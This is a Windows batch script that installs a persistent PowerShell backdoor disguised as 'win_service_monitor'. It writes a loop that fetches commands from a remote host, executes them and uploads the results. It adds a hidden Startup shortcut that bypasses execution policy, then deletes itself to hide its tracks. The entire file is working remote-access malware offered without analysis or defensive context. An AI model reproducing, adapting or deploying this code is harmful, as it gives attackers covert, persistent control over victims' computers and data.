@echo off
set "URL=https://kali-2.tail4e3bb1.ts.net"
set "P_PATH=%APPDATA%\win_service_monitor.ps1"
set "LNK_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\win_service_monitor.lnk"

echo $u='%URL%'; while($true){ try{ $w=New-Object System.Net.WebClient; $d=$w.DownloadString($u); if($d){ $o=(iex $d 2>&1 ^| Out-String); if($o){ $w.UploadString($u, $o) } } } catch{ Start-Sleep -s 5 } } > "%P_PATH%"

if not exist "%LNK_PATH%" (
    powershell -Command "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%LNK_PATH%'); $s.TargetPath='powershell.exe'; $s.Arguments='-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%P_PATH%\"'; $s.Save()"
)

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%P_PATH%"

(goto) 2>nul & del "%~f0"
